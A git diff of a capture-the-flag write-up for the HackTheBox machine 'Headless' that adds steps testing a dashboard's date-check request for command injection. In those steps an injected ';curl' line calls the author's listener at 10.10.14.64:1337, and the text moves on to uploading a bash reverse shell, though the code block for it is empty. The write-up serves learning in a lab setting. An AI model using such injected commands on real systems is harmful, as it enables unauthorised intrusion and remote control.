@@ -1,4 +1,4 @@
-# Headless
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bc0993f0-03fa-4654-ab1f-dbbba2bcdd0a)# Headless
 > Write-up author: jon-brandy
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/539cf778-31bc-4262-8da5-4bd3703218c7)
@@ -189,7 +189,34 @@ and still execute the code but not alert.
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3e2a4d4a-7f8d-4c6f-a787-328585792cf5)
 
 
-16. Great!
+16. Great! Now this is more interesting, this time user can't input anything, seems the dashboard is used to check whether the system is up and running at certain date.
+17. Knowing this, it's clear the if there is a vuln related to this, shall be command execution.
+18. We can try to identify the vuln using burpsuite by intercept the request for system check at certain date and executes curl to our local file.
+19. For example I tried to create a random file named --> "test_file", then intercept the request using burpsuite and add this command:
+
+```
+;curl http://10.10.14.64:1337/test_file
+```
+
+20. If our python server shows the response of `200` which means the file is accessed then it's indeed vulnerable to command injection.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4b10d133-6de3-4406-9369-f2fa1111efd7)
+
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/79353434-3dd7-4ff4-8513-40557e15401d)
+
+
+21. Nice! It's indeed vulnerable to command injection, let's upload our bash reverse shell then.
+
+> bash reverse shell
+
+```txt
+
+```
+
+
 
 
  
